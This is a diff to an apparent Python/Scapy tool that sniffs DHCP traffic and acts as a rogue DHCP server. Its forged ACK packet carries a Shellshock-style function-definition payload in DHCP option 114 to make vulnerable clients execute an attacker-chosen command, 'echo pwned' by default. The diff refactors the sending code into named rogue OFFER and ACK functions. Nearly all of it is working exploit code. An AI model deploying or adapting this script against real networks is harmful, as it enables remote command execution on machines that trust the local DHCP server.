@@ -8,13 +8,10 @@ License MIT
 
 from __future__ import print_function
 
-# from orca.sound import args
-import binascii
-from scapy.all import *
-import time
 import argparse
-import logging
+import binascii
 
+from scapy.all import *
 from scapy.layers.dhcp import DHCP, BOOTP
 from scapy.layers.inet import IP, UDP
 from scapy.layers.l2 import Ether
@@ -28,43 +25,6 @@ parser.add_argument('-c', '--cmd', type=str, help='Command to execute [default: 
 args = parser.parse_args()
 
 command = args.cmd or "echo 'pwned'"
-
-
-# args.iface
-
-def dhcp_offer(raw_mac, xid):
-    packet = (Ether(src=get_if_hwaddr("wlo1"), dst='ff:ff:ff:ff:ff:ff') /
-              IP(src="192.168.2.69", dst='255.255.255.255') /
-              UDP(sport=67, dport=68) /
-              BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr='192.168.2.4', siaddr='192.168.2.1', xid=xid) /
-              DHCP(options=[("message-type", "offer"),
-                            ('server_id', '192.168.2.1'),
-                            ('subnet_mask', '255.255.255.0'),
-                            ('router', '192.168.2.5'),
-                            ('lease_time', 172800),
-                            ('renewal_time', 86400),
-                            ('rebinding_time', 138240),
-                            "end"]))
-
-    return packet
-
-
-def dhcp_ack(raw_mac, xid, command):
-    packet = (Ether(src=get_if_hwaddr("wlo1"), dst='ff:ff:ff:ff:ff:ff') /
-              IP(src="192.168.2.1", dst='255.255.255.255') /
-              UDP(sport=67, dport=68) /
-              BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr='192.168.2.4', siaddr='192.168.2.1', xid=xid) /
-              DHCP(options=[("message-type", "ack"),
-                            ('server_id', '192.168.2.1'),
-                            ('subnet_mask', '255.255.255.0'),
-                            ('router', '192.168.2.5'),
-                            ('lease_time', 172800),
-                            ('renewal_time', 86400),
-                            ('rebinding_time', 138240),
-                            (114, b"() { ignored;}; " + b"{command}"),
-                            "end"]))
-
-    return packet
 
 
 # Fixup function to extract dhcp_options by key
@@ -87,44 +47,99 @@ def get_option(dhcp_options, key):
         pass
 
 
-def handle_dhcp_packet(packet):
-    # print('#######################')
-    # print(args.iface)
-    # print('#######################')
+def make_dhcp_offer_packet(raw_mac, xid):
+    packet = (Ether(src=get_if_hwaddr(args.iface), dst='ff:ff:ff:ff:ff:ff') /
+              IP(src="192.168.2.1", dst='255.255.255.255') /
+              UDP(sport=67, dport=68) /
+              BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr='192.168.2.4', siaddr='192.168.2.1', xid=xid) /
+              DHCP(options=[("message-type", "offer"),
+                            ('server_id', '192.168.2.1'),
+                            ('subnet_mask', '255.255.255.0'),
+                            ('router', '192.168.2.5'),
+                            ('lease_time', 172800),
+                            ('renewal_time', 86400),
+                            ('rebinding_time', 138240),
+                            "end"]))
+
+    return packet
+
+
+def make_dhcp_ack_packet(raw_mac, xid, command):
+    packet = (Ether(src=get_if_hwaddr(args.iface), dst='ff:ff:ff:ff:ff:ff') /
+              IP(src="192.168.2.1", dst='255.255.255.255') /
+              UDP(sport=67, dport=68) /
+              BOOTP(op='BOOTREPLY', chaddr=raw_mac, yiaddr='192.168.2.4', siaddr='192.168.2.1', xid=xid) /
+              DHCP(options=[("message-type", "ack"),
+                            ('server_id', '192.168.2.1'),
+                            ('subnet_mask', '255.255.255.0'),
+                            ('router', '192.168.2.5'),
+                            ('lease_time', 172800),
+                            ('renewal_time', 86400),
+                            ('rebinding_time', 138240),
+                            (114, b"() { ignored;}; " + b"{command}"),
+                            "end"]))
+
+    return packet
+
+
+def send_rogue_dhcp_offer_packet(packet):
     mac_addr = packet[Ether].src
     raw_mac = binascii.unhexlify(mac_addr.replace(":", ""))
 
-    # packet = dhcp_offer('ba:ba:ba:ba:ba:ba', 2)
-    # sendp(packet, iface='wlo1')
+    xid = packet[BOOTP].xid
+    print("[*] Got dhcp DISCOVER from: " + mac_addr + " xid: " + hex(xid))
 
+    print('XXXXXXXXXXXXXX Rogue OFFER packet on BUILD XXXXXXXXXXXXXX')
+
+    new_packet = make_dhcp_offer_packet(raw_mac, xid)
+    print('New Packet data is:')
+    print(new_packet.show())
+    print("\n[*] Sending Rogue OFFER...")
+    sendp(new_packet, iface=args.iface)
+
+    print('XXXXXXXXXXXXXXX  Rogue OFFER packet SENT XXXXXXXXXXXXXX')
+    return
+
+
+def send_rogue_dhcp_ACK_packet(packet):
+    mac_addr = packet[Ether].src
+    raw_mac = binascii.unhexlify(mac_addr.replace(":", ""))
+
+    xid = packet[BOOTP].xid
+    print("[*] Got dhcp REQUEST from: " + mac_addr + " xid: " + hex(xid))
+
+    print('XXXXXXXXXXXXXX Rogue ACK packet on BUILD XXXXXXXXXXXXXX')
+
+    new_packet = make_dhcp_ack_packet(raw_mac, xid, command)
+
+    print('New Packet data is:')
+    print(new_packet.show())
+    print("\n[*] Sending ACK...")
+    sendp(new_packet, iface=args.iface)
+    print('XXXXXXXXXXXXXX Rogue ACK packet SENT XXXXXXXXXXXXXX')
+
+    return
+
+
+def handle_dhcp_packet(packet):
     # print hexdump(packet)
-    # print packet.show()
-    # print ('hi')
+
     # Match DHCP discover
     if DHCP in packet and packet[DHCP].options[0][1] == 1:
         print('---')
-        print('New DHCP Discover')
-        # print(packet.summary())
-        print(ls(packet))
+        print('New GOOD DHCP Discover')
         hostname = get_option(packet[DHCP].options, 'hostname')
         print(f"Host {hostname} ({packet[Ether].src}) asked for an IP")
 
-        xid = packet[BOOTP].xid
-        print("[*] Got dhcp DISCOVER from: " + mac_addr + " xid: " + hex(xid))
-        print("[*] Sending OFFER...")
-        new_packet = dhcp_offer(raw_mac, xid)
-        # print hexdump(packet)
-        # print packet.show()
-        sendp(new_packet, iface="wlo1")
-        print("ROGUE SERVER SENDING OFFER PACKET.")
-
+        # Sending rogue offer packet
+        send_rogue_dhcp_offer_packet(packet)
 
     # Match DHCP offer
     elif DHCP in packet and packet[DHCP].options[0][1] == 2:
         print('---')
-        print('New DHCP Offer')
+        print('New GOOD DHCP Offer')
         # print(packet.summary())
-        print(ls(packet))
+        # print(ls(packet))
 
         subnet_mask = get_option(packet[DHCP].options, 'subnet_mask')
         lease_time = get_option(packet[DHCP].options, 'lease_time')
@@ -139,11 +154,10 @@ def handle_dhcp_packet(packet):
               f"{lease_time}, router: {router}, name_server: {name_server}, "
               f"domain: {domain}")
 
-
     # Match DHCP request
     elif DHCP in packet and packet[DHCP].options[0][1] == 3:
         print('---')
-        print('New DHCP Request')
+        print('New GOOD DHCP Request')
         # print(packet.summary())
         # print(ls(packet))
 
@@ -151,29 +165,13 @@ def handle_dhcp_packet(packet):
         hostname = get_option(packet[DHCP].options, 'hostname')
         print(f"Host {hostname} ({packet[Ether].src}) requested {requested_addr}")
 
-        xid = packet[BOOTP].xid
-        print("[*] Got dhcp REQUEST from: " + mac_addr + " xid: " + hex(xid))
-        print("[*] Sending ACK...")
-        # print(command)
-        new_packet = dhcp_ack(raw_mac, xid, command)
-        # new_packet = dhcp_offer(raw_mac, xid)
-
-        # print hexdump(packet)
-        # print packet.show()
-
-        sendp(new_packet, iface="wlo1")
-
-        print('#######################')
-        print("Not working.")
-        print('#######################')
-
-        print("ROGUE SERVER SENDING ACK PACKET.")
-
+        # sending rogue ack packet
+        send_rogue_dhcp_ACK_packet(packet)
 
     # Match DHCP ack
     elif DHCP in packet and packet[DHCP].options[0][1] == 5:
         print('---')
-        print('New DHCP Ack')
+        print('New GOOD DHCP Ack')
         # print(packet.summary())
         # print(ls(packet))
 
@@ -191,7 +189,7 @@ def handle_dhcp_packet(packet):
     # Match DHCP inform
     elif DHCP in packet and packet[DHCP].options[0][1] == 8:
         print('---')
-        print('New DHCP Inform')
+        print('New GOOD DHCP Inform')
         # print(packet.summary())
         # print(ls(packet))
 
@@ -204,11 +202,14 @@ def handle_dhcp_packet(packet):
     else:
         print('---')
         print('Some Other DHCP Packet')
-        print(packet.summary())
-        print(ls(packet))
+        # print(packet.summary())
+        # print(ls(packet))
+
+    print('Packet data is:')
+    print(packet.show())
 
     return
 
 
 if __name__ == "__main__":
-    sniff(iface="wlo1", filter="udp and (port 67 or 68)", prn=handle_dhcp_packet)
+    sniff(iface=args.iface, filter="udp and (port 67 or 68)", prn=handle_dhcp_packet)
